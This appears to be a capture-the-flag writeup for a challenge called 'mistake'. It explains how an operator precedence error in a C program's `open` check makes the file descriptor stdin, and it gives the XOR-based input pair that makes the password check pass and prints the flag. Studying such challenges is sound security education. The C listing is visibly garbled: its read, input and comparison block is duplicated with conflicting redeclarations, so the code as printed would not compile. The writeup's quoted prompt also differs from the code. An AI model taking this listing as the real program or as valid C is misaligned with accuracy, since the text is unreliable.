# mistake Writeup

An operator precedence mistake causes an exploitable bug.
<details>
<summary> mistake.c </summary>
<p>
        
```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }

        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```
</p>
</details>

## Discovery

First thing you should notice is that when running the program, it hangs until you press enter. Something magic is a foot here. There was no `scanf` before the **input passcode:** line so why did it ask for input? The bug is on the line where they `open` the file descriptor. The programmer forgot their operator precedence, and this results in the line `fd=open("/home/mistake/password",O_RDONLY,0400) < 0` which the user thinks is going to evaluate to `(fd=open("/home/mistake/password",O_RDONLY,0400)) < 0` actually evauating like `fd=(open("/home/mistake/password",O_RDONLY,0400) < 0)` `fd` in this case will always equal `0`, which is `stdin`. Great! We have a way to insert our own values into `pw_buf`. However, simply setting `pw_buf` and `pw_buf2` as equal will not work because it is being XORed by the `xor` function. We see it just XORs every character in `pw_buf2` by `1`, so therefore, we need `pw_buf` to hold the end result of that `xor`. We can play around a bit and find a character that works.

```
irb(main):004:0> (?d.ord ^ 1).chr
=> "e"
```

## Solution
```bash
mistake@ubuntu:~$ ./mistake
do not bruteforce...
dddddddddd
input password : eeeeeeeeee
Password OK
Mommy, <KEY>
mistake@ubuntu:~$ 
```
